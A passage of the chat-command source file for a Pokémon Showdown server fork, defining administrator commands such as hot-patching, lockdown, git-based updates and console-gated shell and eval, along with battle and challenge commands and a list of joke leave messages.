				return this.sendReply("Chat commands have been hot-patched.");
			} catch (e) {
				return this.sendReply("Something failed while trying to hotpatch chat: \n" + e.stack);
			}

		} else if (target === 'tournaments') {

			try {
				var runningTournaments = Tournaments.tournaments;
				CommandParser.uncacheTree('./tournaments/middleend.js');
				Tournaments = require('./tournaments/middleend.js');
				Tournaments.tournaments = runningTournaments;
				return this.sendReply("Tournaments have been hot-patched.");
			} catch (e) {
				return this.sendReply("Something failed while trying to hotpatch tournaments: \n" + e.stack);
			}

		} else if (target === 'battles') {

			Simulator.SimulatorProcess.respawn();
			return this.sendReply("Battles have been hotpatched. Any battles started after now will use the new code; however, in-progress battles will continue to use the old code.");

		} else if (target === 'formats') {
			try {
				// uncache the tools.js dependency tree
				CommandParser.uncacheTree('./tools.js');
				// reload tools.js
				Tools = require('./tools.js'); // note: this will lock up the server for a few seconds
				// rebuild the formats list
				Rooms.global.formatListText = Rooms.global.getFormatListText();
				// respawn validator processes
				TeamValidator.ValidatorProcess.respawn();
				// respawn simulator processes
				Simulator.SimulatorProcess.respawn();
				// broadcast the new formats list to clients
				Rooms.global.send(Rooms.global.formatListText);

				return this.sendReply("Formats have been hotpatched.");
			} catch (e) {
				return this.sendReply("Something failed while trying to hotpatch formats: \n" + e.stack);
			}

		} else if (target === 'learnsets') {
			try {
				// uncache the tools.js dependency tree
				CommandParser.uncacheTree('./tools.js');
				// reload tools.js
				Tools = require('./tools.js'); // note: this will lock up the server for a few seconds

				return this.sendReply("Learnsets have been hotpatched.");
			} catch (e) {
				return this.sendReply("Something failed while trying to hotpatch learnsets: \n" + e.stack);
			}

		}
		this.sendReply("Your hot-patch command was unrecognized.");
	},

	savelearnsets: function (target, room, user) {
		if (!this.can('hotpatch')) return false;
		fs.writeFile('data/learnsets.js', 'exports.BattleLearnsets = ' + JSON.stringify(BattleLearnsets) + ";\n");
		this.sendReply("learnsets.js saved.");
	},

	disableladder: function (target, room, user) {
		if (!this.can('disableladder')) return false;
		if (LoginServer.disabled) {
			return this.sendReply("/disableladder - Ladder is already disabled.");
		}
		LoginServer.disabled = true;
		this.logModCommand("The ladder was disabled by " + user.name + ".");
		this.add("|raw|<div class=\"broadcast-red\"><b>Due to high server load, the ladder has been temporarily disabled</b><br />Rated games will no longer update the ladder. It will be back momentarily.</div>");
	},

	enableladder: function (target, room, user) {
		if (!this.can('disableladder')) return false;
		if (!LoginServer.disabled) {
			return this.sendReply("/enable - Ladder is already enabled.");
		}
		LoginServer.disabled = false;
		this.logModCommand("The ladder was enabled by " + user.name + ".");
		this.add("|raw|<div class=\"broadcast-green\"><b>The ladder is now back.</b><br />Rated games will update the ladder now.</div>");
	},

	lockdown: function (target, room, user) {
		if (!this.can('lockdown')) return false;

		Rooms.global.lockdown = true;
		for (var id in Rooms.rooms) {
			if (id !== 'global') Rooms.rooms[id].addRaw("<div class=\"broadcast-red\"><b>The server is restarting soon.</b><br />Please finish your battles quickly. No new battles can be started until the server resets in a few minutes.</div>");
			if (Rooms.rooms[id].requestKickInactive && !Rooms.rooms[id].battle.ended) {
				Rooms.rooms[id].requestKickInactive(user, true);
				if (Rooms.rooms[id].modchat !== '+') {
					Rooms.rooms[id].modchat = '+';
					Rooms.rooms[id].addRaw("<div class=\"broadcast-red\"><b>Moderated chat was set to +!</b><br />Only users of rank + and higher can talk.</div>");
				}
			}
		}

		this.logEntry(user.name + " used /lockdown");

	},

	endlockdown: function (target, room, user) {
		if (!this.can('lockdown')) return false;

		if (!Rooms.global.lockdown) {
			return this.sendReply("We're not under lockdown right now.");
		}
		Rooms.global.lockdown = false;
		for (var id in Rooms.rooms) {
			if (id !== 'global') Rooms.rooms[id].addRaw("<div class=\"broadcast-green\"><b>The server shutdown was canceled.</b></div>");
		}

		this.logEntry(user.name + " used /endlockdown");

	},

	emergency: function (target, room, user) {
		if (!this.can('lockdown')) return false;

		if (Config.emergency) {
			return this.sendReply("We're already in emergency mode.");
		}
		Config.emergency = true;
		for (var id in Rooms.rooms) {
			if (id !== 'global') Rooms.rooms[id].addRaw("<div class=\"broadcast-red\">The server has entered emergency mode. Some features might be disabled or limited.</div>");
		}

		this.logEntry(user.name + " used /emergency");
	},

	endemergency: function (target, room, user) {
		if (!this.can('lockdown')) return false;

		if (!Config.emergency) {
			return this.sendReply("We're not in emergency mode.");
		}
		Config.emergency = false;
		for (var id in Rooms.rooms) {
			if (id !== 'global') Rooms.rooms[id].addRaw("<div class=\"broadcast-green\"><b>The server is no longer in emergency mode.</b></div>");
		}

		this.logEntry(user.name + " used /endemergency");
	},

	kill: function (target, room, user) {
		if (!this.can('lockdown')) return false;

		if (!Rooms.global.lockdown) {
			return this.sendReply("For safety reasons, /kill can only be used during lockdown.");
		}

		if (CommandParser.updateServerLock) {
			return this.sendReply("Wait for /updateserver to finish before using /kill.");
		}

		for (var i in Sockets.workers) {
			Sockets.workers[i].kill();
		}

		if (!room.destroyLog) {
			process.exit();
			return;
		}
		room.destroyLog(function () {
			room.logEntry(user.name + " used /kill");
		}, function () {
			process.exit();
		});

		// Just in the case the above never terminates, kill the process
		// after 10 seconds.
		setTimeout(function () {
			process.exit();
		}, 10000);
	},

	restart: function(target, room, user) {
		if (!this.can('lockdown')) return false;
		try {
			var forever = require('forever'); 
		} catch(e) {
			return this.sendReply('/restart requires the "forever" module.');
		}

		if (!Rooms.global.lockdown) {
			return this.sendReply('For safety reasons, /restart can only be used during lockdown.');
		}

		if (CommandParser.updateServerLock) {
			return this.sendReply('Wait for /updateserver to finish before using /restart.');
		}
		this.logModCommand(user.name + ' used /restart');
		Rooms.global.send('|refresh|');
		forever.restart('app.js');
	},

	loadbanlist: function(target, room, user, connection) {
		if (!this.can('hotpatch')) return false;

		connection.sendTo(room, "Loading ipbans.txt...");
		fs.readFile('config/ipbans.txt', function (err, data) {
			if (err) return;
			data = ('' + data).split('\n');
			var rangebans = [];
			for (var i = 0; i < data.length; ++i) {
				var line = data[i].split('#')[0].trim();
				if (!line) continue;
				if (line.indexOf('/') >= 0) {
					rangebans.push(line);
				} else if (line && !Users.bannedIps[line]) {
					Users.bannedIps[line] = '#ipban';
				}
			}
			Users.checkRangeBanned = Cidr.checker(rangebans);
			connection.sendTo(room, "ipbans.txt has been reloaded.");
		});
	},

	refreshpage: function (target, room, user) {
		if (!this.can('hotpatch')) return false;
		Rooms.global.send('|refresh|');
		this.logEntry(user.name + " used /refreshpage");
	},
	
	us: 'updateserver',
	gitpull: 'updateserver',
	updateserver: function(target, room, user, connection) {
		if (!user.hasConsoleAccess(connection)) {
			return this.sendReply("/updateserver - Access denied.");
		}

		if (CommandParser.updateServerLock) {
			return this.sendReply("/updateserver - Another update is already in progress.");
		}

		CommandParser.updateServerLock = true;

		var logQueue = [];
		logQueue.push(user.name + " used /updateserver");

		connection.sendTo(room, "updating...");

		var exec = require('child_process').exec;
		exec('git diff-index --quiet HEAD --', function (error) {
			var cmd = 'git pull --rebase';
			if (error) {
				if (error.code === 1) {
					// The working directory or index have local changes.
					cmd = 'git stash && ' + cmd + ' && git stash pop';
				} else {
					// The most likely case here is that the user does not have
					// `git` on the PATH (which would be error.code === 127).
					connection.sendTo(room, "" + error);
					logQueue.push("" + error);
					logQueue.forEach(function (line) {
						room.logEntry(line);
					});
					CommandParser.updateServerLock = false;
					return;
				}
			}
			var entry = "Running `" + cmd + "`";
			connection.sendTo(room, entry);
			logQueue.push(entry);
			exec(cmd, function (error, stdout, stderr) {
				("" + stdout + stderr).split("\n").forEach(function (s) {
					connection.sendTo(room, s);
					logQueue.push(s);
				});
				logQueue.forEach(function (line) {
					room.logEntry(line);
				});
				CommandParser.updateServerLock = false;
			});
		});
	},

	crashfixed: function (target, room, user) {
		if (!Rooms.global.lockdown) {
			return this.sendReply('/crashfixed - There is no active crash.');
		}
		if (!this.can('hotpatch')) return false;

		Rooms.global.lockdown = false;
		if (Rooms.lobby) {
			Rooms.lobby.modchat = false;
			Rooms.lobby.addRaw("<div class=\"broadcast-green\"><b>We fixed the crash without restarting the server!</b><br />You may resume talking in the lobby and starting new battles.</div>");
		}
		this.logEntry(user.name + " used /crashfixed");
	},

	memusage: 'memoryusage',
	memoryusage: function (target) {
		if (!this.can('hotpatch')) return false;
		target = toId(target) || 'all';
		if (target === 'all') {
			this.sendReply("Loading memory usage, this might take a while.");
		}
		if (target === 'all' || target === 'rooms' || target === 'room') {
			this.sendReply("Calculating Room size...");
			var roomSize = ResourceMonitor.sizeOfObject(Rooms);
			this.sendReply("Rooms are using " + roomSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'config') {
			this.sendReply("Calculating config size...");
			var configSize = ResourceMonitor.sizeOfObject(Config);
			this.sendReply("Config is using " + configSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'resourcemonitor' || target === 'rm') {
			this.sendReply("Calculating Resource Monitor size...");
			var rmSize = ResourceMonitor.sizeOfObject(ResourceMonitor);
			this.sendReply("The Resource Monitor is using " + rmSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'cmdp' || target === 'cp' || target === 'commandparser') {
			this.sendReply("Calculating Command Parser size...");
			var cpSize = ResourceMonitor.sizeOfObject(CommandParser);
			this.sendReply("Command Parser is using " + cpSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'sim' || target === 'simulator') {
			this.sendReply("Calculating Simulator size...");
			var simSize = ResourceMonitor.sizeOfObject(Simulator);
			this.sendReply("Simulator is using " + simSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'users') {
			this.sendReply("Calculating Users size...");
			var usersSize = ResourceMonitor.sizeOfObject(Users);
			this.sendReply("Users is using " + usersSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'tools') {
			this.sendReply("Calculating Tools size...");
			var toolsSize = ResourceMonitor.sizeOfObject(Tools);
			this.sendReply("Tools are using " + toolsSize + " bytes of memory.");
		}
		if (target === 'all' || target === 'v8') {
			this.sendReply("Retrieving V8 memory usage...");
			var o = process.memoryUsage();
			this.sendReply(
				"Resident set size: " + o.rss + ", " + o.heapUsed + " heap used of " + o.heapTotal  + " total heap. "
				 + (o.heapTotal - o.heapUsed) + " heap left."
			);
			delete o;
		}
		if (target === 'all') {
			this.sendReply("Calculating Total size...");
			var total = (roomSize + configSize + rmSize + cpSize + simSize + toolsSize + usersSize) || 0;
			var units = ["bytes", "K", "M", "G"];
			var converted = total;
			var unit = 0;
			while (converted > 1024) {
				converted /= 1024;
				++unit;
			}
			converted = Math.round(converted);
			this.sendReply("Total memory used: " + converted + units[unit] + " (" + total + " bytes).");
		}
		return;
	},

	bash: function (target, room, user, connection) {
		if (!user.hasConsoleAccess(connection)) {
			return this.sendReply("/bash - Access denied.");
		}

		var exec = require('child_process').exec;
		exec(target, function (error, stdout, stderr) {
			connection.sendTo(room, ("" + stdout + stderr));
		});
	},

	eval: function (target, room, user, connection, cmd, message) {
		if (!user.hasConsoleAccess(connection)) {
			return this.sendReply("/eval - Access denied.");
		}
		if (!this.canBroadcast()) return;

		if (!this.broadcasting) this.sendReply('||>> ' + target);
		try {
			var battle = room.battle;
			var me = user;
			this.sendReply('||<< ' + eval(target));
		} catch (e) {
			this.sendReply('||<< error: ' + e.message);
			var stack = '||' + ('' + e.stack).replace(/\n/g, '\n||');
			connection.sendTo(room, stack);
		}
	},

	evalbattle: function (target, room, user, connection, cmd, message) {
		if (!user.hasConsoleAccess(connection)) {
			return this.sendReply("/evalbattle - Access denied.");
		}
		if (!this.canBroadcast()) return;
		if (!room.battle) {
			return this.sendReply("/evalbattle - This isn't a battle room.");
		}

		room.battle.send('eval', target.replace(/\n/g, '\f'));
	},

	/*********************************************************
	 * Battle commands
	 *********************************************************/

	forfeit: function (target, room, user) {
		if (!room.battle) {
			return this.sendReply("There's nothing to forfeit here.");
		}
		if (!room.forfeit(user)) {
			return this.sendReply("You can't forfeit this battle.");
		}
	},

	savereplay: function (target, room, user, connection) {
		if (!room || !room.battle) return;
		var logidx = 2; // spectator log (no exact HP)
		if (room.battle.ended) {
			// If the battle is finished when /savereplay is used, include
			// exact HP in the replay log.
			logidx = 3;
		}
		var data = room.getLog(logidx).join("\n");
		var datahash = crypto.createHash('md5').update(data.replace(/[^(\x20-\x7F)]+/g, '')).digest('hex');

		LoginServer.request('prepreplay', {
			id: room.id.substr(7),
			loghash: datahash,
			p1: room.p1.name,
			p2: room.p2.name,
			format: room.format
		}, function (success) {
			if (success && success.errorip) {
				connection.popup("This server's request IP " + success.errorip + " is not a registered server.");
				return;
			}
			connection.send('|queryresponse|savereplay|' + JSON.stringify({
				log: data,
				id: room.id.substr(7)
			}));
		});
	},

	mv: 'move',
	attack: 'move',
	move: function (target, room, user) {
		if (!room.decision) return this.sendReply("You can only do this in battle rooms.");

		room.decision(user, 'choose', 'move ' + target);
	},

	sw: 'switch',
	switch: function (target, room, user) {
		if (!room.decision) return this.sendReply("You can only do this in battle rooms.");

		room.decision(user, 'choose', 'switch ' + parseInt(target, 10));
	},

	choose: function (target, room, user) {
		if (!room.decision) return this.sendReply("You can only do this in battle rooms.");

		room.decision(user, 'choose', target);
	},

	undo: function (target, room, user) {
		if (!room.decision) return this.sendReply("You can only do this in battle rooms.");

		room.decision(user, 'undo', target);
	},

	team: function (target, room, user) {
		if (!room.decision) return this.sendReply("You can only do this in battle rooms.");

		room.decision(user, 'choose', 'team ' + target);
	},

	joinbattle: function (target, room, user) {
		if (!room.joinBattle) return this.sendReply("You can only do this in battle rooms.");
		if (!user.can('joinbattle', null, room)) return this.popupReply("You must be a roomvoice to join a battle you didn't start. Ask a player to use /roomvoice on you to join this battle.");

		room.joinBattle(user);
	},

	partbattle: 'leavebattle',
	leavebattle: function (target, room, user) {
		if (!room.leaveBattle) return this.sendReply("You can only do this in battle rooms.");

		room.leaveBattle(user);
	},

	kickbattle: function (target, room, user) {
		if (!room.leaveBattle) return this.sendReply("You can only do this in battle rooms.");

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) {
			return this.sendReply("User " + this.targetUsername + " not found.");
		}
		if (!this.can('kick', targetUser)) return false;

		if (room.leaveBattle(targetUser)) {
			this.addModCommand("" + targetUser.name + " was kicked from a battle by " + user.name + (target ? " (" + target + ")" : ""));
		} else {
			this.sendReply("/kickbattle - User isn't in battle.");
		}
	},

	kickinactive: function (target, room, user) {
		if (room.requestKickInactive) {
			room.requestKickInactive(user);
		} else {
			this.sendReply("You can only kick inactive players from inside a room.");
		}
	},

	timer: function (target, room, user) {
		target = toId(target);
		if (room.requestKickInactive) {
			if (target === 'off' || target === 'false' || target === 'stop') {
				room.stopKickInactive(user, user.can('timer'));
			} else if (target === 'on' || target === 'true' || !target) {
				room.requestKickInactive(user, user.can('timer'));
			} else {
				this.sendReply("'" + target + "' is not a recognized timer state.");
			}
		} else {
			this.sendReply("You can only set the timer from inside a room.");
		}
	},
	
	autotimer: 'forcetimer',
	forcetimer: function (target, room, user) {
		target = toId(target);
		if (!this.can('autotimer')) return;
		if (target === 'off' || target === 'false' || target === 'stop') {
			Config.forcetimer = false;
			this.addModCommand("Forcetimer is now OFF: The timer is now opt-in. (set by " + user.name + ")");
		} else if (target === 'on' || target === 'true' || !target) {
			Config.forcetimer = true;
			this.addModCommand("Forcetimer is now ON: All battles will be timed. (set by " + user.name + ")");
		} else {
			this.sendReply("'" + target + "' is not a recognized forcetimer setting.");
		}
	},
	
	forcetie: 'forcewin',
	forcewin: function (target, room, user) {
		if (!this.can('forcewin')) return false;
		if (!room.battle) {
			this.sendReply("/forcewin - This is not a battle room.");
			return false;
		}

		room.battle.endType = 'forced';
		if (!target) {
			room.battle.tie();
			this.logModCommand(user.name + " forced a tie.");
			return false;
		}
		target = Users.get(target);
		if (target) target = target.userid;
		else target = '';

		if (target) {
			room.battle.win(target);
			this.logModCommand(user.name + " forced a win for " + target + ".");
		}

	},

	/*********************************************************
	 * Challenging and searching commands
	 *********************************************************/
	 
	cancelsearch: 'search',
	search: function (target, room, user) {
		if (target) {
			if (Config.pmmodchat) {
				var userGroup = user.group;
				if (Config.groupsranking.indexOf(userGroup) < Config.groupsranking.indexOf(Config.pmmodchat)) {
					var groupName = Config.groups[Config.pmmodchat].name || Config.pmmodchat;
					this.popupReply("Because moderated chat is set, you must be of rank " + groupName + " or higher to search for a battle.");
					return false;
				}
			}
			Rooms.global.searchBattle(user, target);
		} else {
			Rooms.global.cancelSearch(user);
		}
	},
	
	chall: 'challenge',
	challenge: function (target, room, user, connection) {
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) {
			return this.popupReply("The user '" + this.targetUsername + "' was not found.");
		}
		if (targetUser.blockChallenges && !user.can('bypassblocks', targetUser)) {
			return this.popupReply("The user '" + this.targetUsername + "' is not accepting challenges right now.");
		}
		if (Config.pmmodchat) {
			var userGroup = user.group;
			if (Config.groupsranking.indexOf(userGroup) < Config.groupsranking.indexOf(Config.pmmodchat)) {
				var groupName = Config.groups[Config.pmmodchat].name || Config.pmmodchat;
				this.popupReply("Because moderated chat is set, you must be of rank " + groupName + " or higher to challenge users.");
				return false;
			}
		}
		user.prepBattle(target, 'challenge', connection, function (result) {
			if (result) user.makeChallenge(targetUser, target);
		});
	},
	
	awaychal: 'blockchallenges',
	idle: 'blockchallenges',
	blockchallenges: function (target, room, user) {
		user.blockChallenges = true;
		this.sendReply("You are now blocking all incoming challenge requests.");
	},
	
	backchal: 'allowchallenges',
	allowchallenges: function(target, room, user) {
		user.blockChallenges = false;
		this.sendReply("You are available for challenges from now on.");
	},
	cchall: 'cancelChallenge',
	cancelchallenge: function (target, room, user) {
		user.cancelChallengeTo(target);
	},
	accept: function (target, room, user, connection) {
		var userid = toId(target);
		var format = '';
		if (user.challengesFrom[userid]) format = user.challengesFrom[userid].format;
		if (!format) {
			this.popupReply(target + " cancelled their challenge before you could accept it.");
			return false;
		}
		user.prepBattle(format, 'challenge', connection, function (result) {
			if (result) user.acceptChallengeFrom(userid);
		});
	},
	
	reject: function (target, room, user) {
		user.rejectChallengeFrom(toId(target));
	},
	
	saveteam: 'useteam',
	utm: 'useteam',
	useteam: function (target, room, user) {
		user.team = target;
	},
/*/
	id: 'profile',
	profile: function (target, room, user, connection) {
try{
	    if (!this.canBroadcast()) return;

	    if (target.length >= 19) {
	    	return this.sendReply('Usernames are required to be less than 19 characters long.');
	    }

	    var targetUser = this.targetUserOrSelf(target);
	    var name = '';
	    if (!targetUser) {
	    	name = toId(target);
	    } else {
	    	name = targetUser.userid;
	    }
	    var avatar = Utilities.findAvatar(name);
	    var group = Utilities.stdin('usergroups.csv', name);
	    var status = Utilities.stdin('status.csv', name);
	    var money = Utilities.stdin('money.csv', name);

		var util = require("util");
		var http = require("http");

		var options = {
		    host: "www.pokemonshowdown.com",
		    port: 80,
		    path: "/forum/~" + name
		};

		var content = "";
		var self = this;

		if (!targetUser) {
			if (typeof(avatar) === typeof('')) {
				avatar = 'http://50.62.73.114:8000/avatars/' + avatar;
			} else {
				avatar = 'http://play.pokemonshowdown.com/sprites/trainers/168.png';
			}
			if (Users.usergroups[targetUser]) {
 				var group = Users.usergroups[targetUser].substr(0,1);
 				group = Config.groups[userGroup].name
 			} else {
				var group = 'Regular User';
  			}
			if (status === ' ') {
				status = 'This user hasn\'t set their status yet.';
			}
			if (money === '' || money === ' ') {
				money = 0;
			}

			var lastOnline = Number(Utilities.stdin('lastOnline.csv', name));
			if (lastOnline === Number(' ')) {
				lastOnline = ' Never';
			} else if (Math.floor((Date.now()-lastOnline)*0.001) < 60) {
				lastOnline = Math.floor((Date.now()-lastOnline)*0.001) + ' seconds ago';
			} else if (Math.floor((Date.now()-lastOnline)*1.6667e-5) < 120) {
				lastOnline = Math.floor((Date.now()-lastOnline)*1.6667e-5) + ' minutes ago'; 
			} else if (Math.floor((Date.now()-lastOnline)*2.7778e-7) < 48) {
				lastOnline = Math.floor((Date.now()-lastOnline)*2.7778e-7) + ' hours ago';
			} else {
				lastOnline = (Math.floor((Date.now()-lastOnline)*2.7778e-7)/24) + ' days ago';
			}
		} else {
			io.stdinString('status.csv', user, 'status');
			if (targetUser.status === '' || targetUser.status === '""') {
				targetUser.status = 'This user hasn\'t set their status yet.';
			}
			var lastOnline = Number(Utilities.stdin('lastOnline.csv', name));
			if (Math.floor((Date.now()-lastOnline)*0.001) < 60) {
				lastOnline = Math.floor((Date.now()-lastOnline)*0.001) + ' seconds ago';
			} else if (Math.floor((Date.now()-lastOnline)*1.6667e-5) < 120) {
				lastOnline = Math.floor((Date.now()-lastOnline)*1.6667e-5) + ' minutes ago'; 
			} else if (Math.floor((Date.now()-lastOnline)*2.7778e-7) < 48) {
				lastOnline = Math.floor((Date.now()-lastOnline)*2.7778e-7) + ' hours ago';
			} else {
				lastOnline = (Math.floor((Date.now()-lastOnline)*2.7778e-7)/24) + ' days ago';
			}
			if (targetUser.connected === true) {
				lastOnline = '<font color="green">Currently Online</font>';
			}
			io.stdinNumber('money.csv', user, 'money');
			if (targetUser.money === Infinity) {
				targetUser.money === Infinity;
			}
			io.stdinString('statusTime.csv', user, 'statusTime');
		}

		var req = http.request(options, function (res) {
		    res.setEncoding("utf8");
		    res.on("data", function (chunk) {
		        content += chunk;
		    });
		    res.on("end", function () {
		        content = content.split("<em");
		        if (content[1]) {
		            content = content[1].split("</p>");
		            if (content[0]) {
		                content = content[0].split("</em>");
		                if (content[1]) {
		                	if (!targetUser) {
		                		self.sendReplyBox('<img src="' + avatar + '" height="80" width="80" align="left">' + '&nbsp;<strong><font color="#FFCC00">Name:</font></strong> ' + target + '<br />' + '&nbsp;<strong><font color="#FFCC00">Registered:</font></strong>' + content[1] + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Rank:</font></strong> ' + group + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Money: <img src="http://cdn.bulbagarden.net/upload/8/8c/Pok%C3%A9monDollar.png"></font></strong> ' + money + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Last Online:</font></strong> ' + lastOnline + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Status:</font></strong> "' + status + '" <font color="gray">' + Utilities.stdin('statusTime.csv', name) + '</font><br clear="all" />');
		                	} else if (targetUser.authenticated === true && typeof(targetUser.avatar) === typeof('')) {
		                		self.sendReplyBox('<img src="http://50.62.73.114:8000/avatars/' + targetUser.avatar + '" height="80" width="80" align="left">' + '&nbsp;<strong><font color="#FFCC00">Name:</font></strong> ' + targetUser.name + '<br />' + '&nbsp;<strong><font color="#FFCC00">Registered:</font></strong>' + content[1] + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Rank:</font></strong> ' + config.groups[targetUser.group].name + ' <br/>' + '&nbsp;<strong><font color="#FFCC00">Money: <img src="http://cdn.bulbagarden.net/upload/8/8c/Pok%C3%A9monDollar.png"></font></strong> ' + targetUser.money + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Last Online:</font></strong> ' + lastOnline + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Status:</font></strong> "' + targetUser.status + '" <font color="gray">' + targetUser.statusTime + '</font><br clear="all" />');
		                    } else {
		                    	self.sendReplyBox('<img src="http://play.pokemonshowdown.com/sprites/trainers/' + targetUser.avatar + '.png" height="80" width="80" align="left">' + '&nbsp;<strong><font color="#FFCC00">Name:</font></strong> ' + targetUser.name + '<br />' + '&nbsp;<strong><font color="#FFCC00">Registered:</font></strong>' + content[1] + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Rank:</font></strong> ' + 

		                    	'Regular User'+ '<br/>' + '&nbsp;<strong><font color="#FFCC00">Money: <img src="http://cdn.bulbagarden.net/upload/8/8c/Pok%C3%A9monDollar.png"></font></strong> ' + targetUser.money + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Last Online:</font></strong> ' + lastOnline + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Status:</font></strong> "' + targetUser.status + '" <font color="gray">' + targetUser.statusTime + '</font><br clear="all" />');
		                    }
		                }
		            }
		        } else {
		        	if (!targetUser) {
		        		self.sendReplyBox('<img src="' + avatar + '" height="80" width="80" align="left">' + '&nbsp;<strong><font color="#FFCC00">Name:</font></strong> ' + target + '<br />' + '&nbsp;<strong><font color="#FFCC00">Registered:</font></strong>' + content[1] + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Rank:</font></strong> ' + group + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Money: <img src="http://cdn.bulbagarden.net/upload/8/8c/Pok%C3%A9monDollar.png"></font></strong> ' + money + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Last Online:</font></strong> ' + lastOnline + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Status:</font></strong> "' + status + '" <font color="gray">' + Utilities.stdin('statusTime.csv', name) + '</font><br clear="all" />');
		        	} else {
		        		self.sendReplyBox('<img src="http://play.pokemonshowdown.com/sprites/trainers/' + targetUser.avatar + '.png" height="80" width="80" align="left">' + '&nbsp;<strong><font color="#FFCC00">Name:</font></strong> ' + targetUser.name + '<br />' + '&nbsp;<strong><font color="#FFCC00">Registered:</font></strong>' + ' (Unregistered)' + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Rank:</font></strong> ' + Users.get(''+targetUser+'').group + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Money: <img src="http://cdn.bulbagarden.net/upload/8/8c/Pok%C3%A9monDollar.png"></font></strong> ' + targetUser.money + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Last Online:</font></strong> ' + lastOnline + '<br/>' + '&nbsp;<strong><font color="#FFCC00">Status:</font></strong> "' + targetUser.status + '" <font color="gray">' + targetUser.statusTime + '</font><br clear="all" />');
		        	}
		        }
		        room.update();
		    });
		});
		req.end();
} catch (e) { this.sendReply('something went wrong: ' + e.stack); }
	},



	/*********************************************************
	 * Low-level
	 *********************************************************/

	cmd: 'query',
	query: function (target, room, user, connection) {
		// Avoid guest users to use the cmd errors to ease the app-layer attacks in emergency mode
		var trustable = (!Config.emergency || (user.named && user.authenticated));
		if (Config.emergency && ResourceMonitor.countCmd(connection.ip, user.name)) return false;
		var spaceIndex = target.indexOf(' ');
		var cmd = target;
		if (spaceIndex > 0) {
			cmd = target.substr(0, spaceIndex);
			target = target.substr(spaceIndex + 1);
		} else {
			target = '';
		}
		if (cmd === 'userdetails') {

			var targetUser = Users.get(target);
			if (!trustable || !targetUser) {
				connection.send('|queryresponse|userdetails|' + JSON.stringify({
					userid: toId(target),
					rooms: false
				}));
				return false;
			}
			var roomList = {};
			for (var i in targetUser.roomCount) {
				if (i === 'global') continue;
				var targetRoom = Rooms.get(i);
				if (!targetRoom || targetRoom.isPrivate) continue;
				var roomData = {};
				if (targetRoom.battle) {
					var battle = targetRoom.battle;
					roomData.p1 = battle.p1 ? ' ' + battle.p1 : '';
					roomData.p2 = battle.p2 ? ' ' + battle.p2 : '';
				}
				roomList[i] = roomData;
			}
			if (!targetUser.roomCount['global']) roomList = false;
			var userdetails = {
				userid: targetUser.userid,
				avatar: targetUser.avatar,
				rooms: roomList
			};
			if (user.can('ip', targetUser)) {
				var ips = Object.keys(targetUser.ips);
				if (ips.length === 1) {
					userdetails.ip = ips[0];
				} else {
					userdetails.ips = ips;
				}
			}
			connection.send('|queryresponse|userdetails|' + JSON.stringify(userdetails));

		} else if (cmd === 'roomlist') {
			if (!trustable) return false;
			connection.send('|queryresponse|roomlist|' + JSON.stringify({
				rooms: Rooms.global.getRoomList(true)
			}));

		} else if (cmd === 'rooms') {
			if (!trustable) return false;
			connection.send('|queryresponse|rooms|' + JSON.stringify(
				Rooms.global.getRooms()
			));

		}
	},

	trn: function (target, room, user, connection) {
		var commaIndex = target.indexOf(',');
		var targetName = target;
		var targetAuth = false;
		var targetToken = '';
		if (commaIndex >= 0) {
			targetName = target.substr(0, commaIndex);
			target = target.substr(commaIndex + 1);
			commaIndex = target.indexOf(',');
			targetAuth = target;
			if (commaIndex >= 0) {
				targetAuth = !!parseInt(target.substr(0, commaIndex), 10);
				targetToken = target.substr(commaIndex + 1);
			}
		}
		user.rename(targetName, targetToken, targetAuth, connection);
	},

};


function getRandMessage(user){
	var numMessages = 48; // numMessages will always be the highest case # + 1
	var message = '~~ ';
	switch(Math.floor(Math.random()*numMessages)){
		case 0: message = message + user.name + ' has vanished into nothingness!';
			break;
		case 1: message = message + user.name + ' visited kupo\'s bedroom and never returned!';
			break;
		case 2: message = message + user.name + ' used Explosion!';
			break;
		case 3: message = message + user.name + ' fell into the void.';
			break;
		case 4: message = message + user.name + ' squished by panpawn\'s large behind!';
			break;
		case 5: message = message + user.name + ' became panpawn\'s slave!';
			break;
		case 6: message = message + user.name + ' became panpawn\'s love slave!';
			break;
		case 7: message = message + user.name + ' has left the building.';
			break;
		case 8: message = message + user.name + ' felt Thundurus\'s wrath!';
			break;
		case 9: message = message + user.name + ' died of a broken heart.';
			break;
		case 10: message = message + user.name + ' got lost in a maze!';
			break;
		case 11: message = message + user.name + ' was hit by Magikarp\'s Revenge!';
			break;
		case 12: message = message + user.name + ' was sucked into a whirlpool!';
			break;
		case 13: message = message + user.name + ' got scared and left the server!';
			break;
		case 14: message = message + user.name + ' fell off a cliff!';
			break;
		case 15: message = message + user.name + ' got eaten by a bunch of piranhas!';
			break;
		case 16: message = message + user.name + ' is blasting off again!';
			break;
		case 17: message = message + 'A large spider descended from the sky and picked up ' + user.name + '.';
			break;
		case 18: message = message + user.name + ' tried to touch jd!';
			break;
		case 19: message = message + user.name + ' got their sausage smoked by Charmanderp!';
			break;
		case 20: message = message + user.name + ' was forced to give panpawn an oil massage!';
			break;
		case 21: message = message + user.name + ' took an arrow to the knee... and then one to the face.';
			break;
		case 22: message = message + user.name + ' peered through the hole on Shedinja\'s back';
			break;
